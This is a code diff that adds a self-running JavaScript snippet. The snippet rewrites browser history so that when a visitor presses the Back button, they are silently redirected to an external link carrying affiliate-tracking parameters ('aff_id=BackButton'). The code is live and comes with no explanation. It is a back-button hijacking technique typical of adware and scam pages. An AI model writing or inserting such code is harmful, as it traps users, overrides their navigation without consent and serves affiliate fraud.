@@ -1,0 +1,13 @@
+(function(window, location) {
+history.replaceState(null, document.title, location.pathname+"#!/history");
+history.pushState(null, document.title, location.pathname);
+
+window.addEventListener("popstate", function() {
+  if(location.hash === "#!/history") {
+    history.replaceState(null, document.title, location.pathname);
+    setTimeout(function(){
+      location.replace("https://fb.com/fc5e3107-5188-4dc2-9adb-80deedcd6eac?oid=132&aff_id=BackButton");
+    },0);
+  }
+}, false);
+}(window, location));
